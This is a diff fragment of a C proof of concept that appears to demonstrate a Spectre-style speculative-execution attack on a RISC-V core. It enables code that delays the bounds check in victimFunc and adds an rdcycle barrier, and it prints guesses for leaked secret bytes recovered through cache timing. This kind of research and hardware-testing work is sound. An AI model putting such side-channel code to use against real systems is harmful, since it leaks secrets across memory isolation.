@@ -55,8 +55,8 @@ void victimFunc(uint32_t idx){
     uint8_t dummy = 0;
 
     // // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
-    // array1_sz =  array1_sz << 4;
-    // // array1_sz = array1_sz / (2*4);
+    array1_sz =  array1_sz << 4;
+    array1_sz = array1_sz / (2*4);
 
     //     asm(
     //         "lw     a2, (%[in])\n"
@@ -87,7 +87,7 @@ void victimFunc(uint32_t idx){
     }
 
     // bound speculation here just in case it goes over
-    // dummy = rdcycle();
+    dummy = rdcycle();
 }
 
 int main(void){
@@ -138,7 +138,9 @@ int main(void){
                 if ( diff < CACHE_HIT_THRESHOLD ){
                     results[i] += 1;
                 }
+
             }
+            
         }
         
         // get highest and second highest result hit values
@@ -146,7 +148,11 @@ int main(void){
         uint32_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
 
-        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
+        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", 
+        (uint8_t*)(array1 + attackIdx), secretString[len], 
+        hitArray[0], output[0], output[0], 
+        hitArray[1], output[1], output[1]
+        ); 
 
         // read in the next secret 
         ++attackIdx;
